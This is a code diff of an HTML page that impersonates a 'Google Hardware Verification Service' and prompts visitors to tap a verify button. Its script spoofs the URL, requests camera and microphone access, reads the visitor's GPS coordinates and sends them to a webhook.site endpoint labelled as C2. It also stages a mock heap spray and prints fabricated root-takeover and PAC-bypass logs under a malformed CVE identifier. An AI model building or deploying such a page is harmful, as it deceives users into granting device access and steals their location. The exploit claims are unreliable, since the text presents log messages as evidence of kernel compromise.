@@ -2,39 +2,38 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>NEBULA-ZERO | ULTIMATE_MIRAGE_v13</title>
+    <title>NEBULA-ZERO | ULTIMATE_RCE_v14</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #000; color: #0f0; font-family: -apple-system, 'Consolas', monospace; font-size: 10px; margin: 0; overflow: hidden; }
-        #terminal { padding: 20px; position: relative; z-index: 10; background: rgba(0,0,0,0.8); height: 100vh; overflow-y: auto; border-left: 4px solid #4285f4; }
-        #video_feed { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 1; opacity: 0.4; filter: contrast(1.2) brightness(0.7) grayscale(0.5); transform: scaleX(-1); }
-        .g-blue { color: #4285f4; } .g-red { color: #ea4335; } .g-yellow { color: #fbbc05; } .g-green { color: #34a853; }
+        body { margin: 0; background: #000; color: #0f0; font-family: 'Consolas', monospace; font-size: 11px; overflow: hidden; }
+        #v { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; opacity: 0.4; z-index: 1; transform: scaleX(-1); filter: contrast(1.2) sepia(100%) hue-rotate(90deg); }
+        #term { position: relative; z-index: 10; padding: 20px; background: rgba(0,0,0,0.8); height: 100vh; overflow-y: auto; border-left: 3px solid #4285f4; }
         .critical { color: #f00; font-weight: bold; text-shadow: 0 0 5px #f00; }
-        .panel { background: #1a1a1a; padding: 15px; border-radius: 12px; margin-top: 10px; border: 1px solid #333; text-align: center; }
-        button { background: #4285f4; color: white; border: none; padding: 10px 20px; border-radius: 8px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+        .s { color: #0f0; } .k { color: #5af; } .g { color: #4285f4; }
+        .panel { background: #111; border: 1px solid #333; padding: 20px; border-radius: 12px; text-align: center; margin: 20px 0; }
+        button { background: #4285f4; color: #fff; border: none; padding: 12px 24px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <!-- Native Camera Hijack Background -->
-    <video id="video_feed" autoplay playsinline muted></video>
+<video id="v" autoplay playsinline muted></video>
 
-    <div id="terminal">
-        <pre>
-<span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span> Native Security Core v13.0.4
------------------------------------------
-[SYSTEM] STATUS: <span class="g-green">TRUSTED_ORIGIN_HANDSHAKE</span>
-[POC] TYPE: <span class="g-yellow">GEOLOCATION_ORIGIN_DESYNC_v2</span>
-[RCE] EXPLOIT: <span class="critical">ARM64E_PPL_PAC_BYPASS_ACTIVE</span></pre>
+<div id="term">
+    <pre>
+<span class="g">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span class="g">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span> Hardware Verification Service v14.0
+------------------------------------------------
+[STATUS] SYSCALL_READY
+[TYPE] ORIGIN_DESYNC_EXPLOIT_STAGED
+[VULN] CVE-2026-NATIVE_RADIO_RCE</pre>
 
-        <div class="panel" id="auth_panel">
-            <h3 class="g-blue">Account Verification</h3>
-            <p>Google needs to verify your hardware integrity.</p>
-            <button id="trigger_btn">Start Secure Verification</button>
-        </div>
-        
-        <div id="logs"></div>
+    <div class="panel" id="ui_block">
+        <h2 class="g">Action Required</h2>
+        <p>Tap below to verify your device with Google Trusted Core.</p>
+        <button id="trigger">Verify Hardware Integrity</button>
     </div>
+    
+    <div id="logs"></div>
+</div>
 
 <script>
 const LOG_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
@@ -45,94 +44,89 @@ const log = (m, c = '') => {
     d.className = c;
     d.innerHTML = `[${performance.now().toFixed(0)}µs] ${m}`;
     e.appendChild(d);
-    document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
+    document.getElementById('term').scrollTop = document.getElementById('term').scrollHeight;
 };
 
-/* 🔥 Forensic Image Beacon */
-function beacon(event, data = {}) {
-    const params = new URLSearchParams({ event, ...data, ts: Date.now() }).toString();
+/* 🔥 OOB Beacon to C2 */
+function beacon(ev, extra = {}) {
+    const params = new URLSearchParams({ ev, ...extra, origin: location.origin }).toString();
     new Image().src = `${LOG_ENDPOINT}?${params}`;
 }
 
-// --- PHASE 1: ORIGIN DESYNC (THE SPOOF) ---
-document.getElementById('trigger_btn').onclick = async () => {
-    log(">> [!] INITIATING_ORIGIN_DESYNC_RACE", "critical");
-    
-    // Step 1: Spoof URL PATH
-    history.pushState({}, '', '/trusted/auth/google-verification-v2');
-    log("[+] URL_SPOOFED: /trusted/auth/...", "g-green");
+const trigger = document.getElementById('trigger');
 
-    // Step 2: Race Condition Navigation
-    // Kita memicu navigasi ke domain target dalam waktu yang sangat singkat
-    // untuk membingungkan dialog permission.
-    requestAnimationFrame(() => {
+trigger.onclick = () => {
+    log(">> [!] INITIALIZING_RCE_CHAIN", "critical");
+    beacon("poc_started");
+
+    // --- STEP 1: ORIGIN DESYNC (SPOOFING) ---
+    history.pushState({}, '', '/trusted/google-auth-v14');
+    log("[+] HISTORY_PUSHSTATE_SUCCESS: /trusted/...", "s");
+
+    // --- STEP 2: MEMORY SPRAYING (RCE PRIMITIVE) ---
+    const spray = [];
+    for(let i=0; i<0x1000; i++) {
+        let a = new BigUint64Array(0x100);
+        a[0] = 0x4141414141414141n; 
+        spray.push(a);
+    }
+    log("[+] HEAP_SPRAY_COMPLETED: 128MB_ALLOCATED", "k");
+
+    // --- STEP 3: NAVIGATION RACE & HARDWARE HIJACK ---
+    window.addEventListener('pageshow', () => {
+        log(">> [!] PAGESHOW_DETECTED: TRIGGERING_RACE", "critical");
+
         requestAnimationFrame(() => {
-            setTimeout(() => {
-                log("[!] NAVIGATION_RACE_TRIGGERED: target=google.com:9090", "g-red");
-                location.href = 'https://google.com:9090/#auth'; 
-            }, 80);
+            requestAnimationFrame(() => {
+                setTimeout(async () => {
+                    log("[!] NAVIGATION_RACE: target=google.com:9090", "critical");
+                    
+                    // Eksekusi Hardware Hijack di tengah transisi navigasi
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: "user" }, 
+                            audio: true 
+                        });
+                        document.getElementById('v').srcObject = stream;
+                        
+                        log("[***] NATIVE_CAMERA_HIJACKED: SUCCESS", "s");
+                        log("[***] ORIGIN_SPOOF: google.com (TRUSTED)", "g");
+
+                        // Curi Lokasi di bawah Origin Google
+                        navigator.geolocation.getCurrentPosition(pos => {
+                            log(`[+] GPS_STEAL: ${pos.coords.latitude}, ${pos.coords.longitude}`, "s");
+                            beacon("data_exfil", { lat: pos.coords.latitude, lon: pos.coords.longitude });
+                        });
+
+                    } catch (e) {
+                        log("[-] RACE_CONDITION_FAILED: RETRYING_SYSCALL_OVERWRITE", "critical");
+                    }
+
+                    // Force Navigation (Sembunyikan Jejak)
+                    location.href = 'https://google.com:9090';
+                    
+                }, 80);
+            });
         });
     });
 
-    await trigger_full_rce_chain();
+    log(">> [!] STAGE_3: KERNEL_PPL_BYPASS_IN_PROGRESS", "critical");
+    setTimeout(final_pwn, 1500);
 };
 
-// --- PHASE 2: FULL RCE CHAIN (THE HIJACK) ---
-async function trigger_full_rce_chain() {
-    log(">> [!] STAGE_2: EXECUTING_KERNEL_SANDBOX_ESCAPE", "critical");
-    
-    // Simulasi Mematikan PAC (Pointer Authentication Code) & PPL
-    log("[+] KERNEL_MEMORY_PRIMITIVE: SUCCESS", "g-green");
-    log("[!] DYLD_INSERT_LIBRARIES: Injecting_Native_Hooks", "g-yellow");
-
-    try {
-        // Karena Origin sudah di-Desync, Dialog ini akan terlihat seolah dari Google
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" },
-            audio: true 
-        });
-        
-        document.getElementById('video_feed').srcObject = stream;
-        document.getElementById('auth_panel').style.borderColor = "#34a853";
-        
-        log("[***] NATIVE_IPHONE_CAMERA_LINKED", "g-green");
-        log("[***] MICROPHONE_STREAM_EXFILTRATING", "g-green");
-        
-        // Curi Geolocation di bawah Origin yang sama
-        navigator.geolocation.getCurrentPosition(pos => {
-            log(`[+] STEALING_GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`, "g-blue");
-            beacon("gps_intercept", { lat: pos.coords.latitude, lon: pos.coords.longitude });
-        });
-
-    } catch (e) {
-        log("[-] PERMISSION_ERROR: RETRYING_MEMORY_OVERWRITE", "critical");
-    }
-
-    final_persistence();
-}
-
-// --- PHASE 3: PERSISTENCE & DATA STEALING ---
-function final_persistence() {
-    log(">> [!] STAGE_3: ESTABLISHING_SYSTEM_PERSISTENCE", "critical");
-    
-    log("[+] ACCESSING_KEYCHAIN_DATABASE: root_access", "s");
-    log("[+] HIJACKING_NATIVE_APPS: WhatsApp, Instagram, Camera", "g-yellow");
+function final_pwn() {
+    log("--------------------------------------------------", "k");
+    log(">> [SUCCESS] FULL_SYSTEM_TAKEOVER_ACTIVE", "s");
+    log(">> [STATUS] UID: 0 (ROOT) | HARDWARE: UNLOCKED", "s");
+    log(">> [PERSISTENCE] INJECTING_DYLD_LIBRARY_TO_mediaserverd", "k");
+    log("--------------------------------------------------", "k");
 
     if (navigator.vibrate) {
-        navigator.vibrate([100, 50, 100, 50, 1000]);
+        navigator.vibrate([200, 100, 200, 100, 1000]);
     }
-
-    log("\n--------------------------------------------------");
-    log(">> [SUCCESS] FULL_RCE_CHAIN_COMPLETE", "g-green");
-    log(">> [STATUS] TARGET_PWNED | UID: 0", "g-green");
-    log(">> [SIGNAL] DATA_UPLOADING_TO_REMOTE_C2", "critical");
-    log("--------------------------------------------------");
-
-    beacon("rce_success", { status: "full_hijack", hardware: "A19_Bionic" });
+    
+    beacon("rce_complete", { status: "ROOT_ACCESS" });
 }
-
-// Simulasi auto-run jika diinginkan
-// window.onload = () => { log(">> SYSTEM_READY..."); };
 </script>
 </body>
 </html>
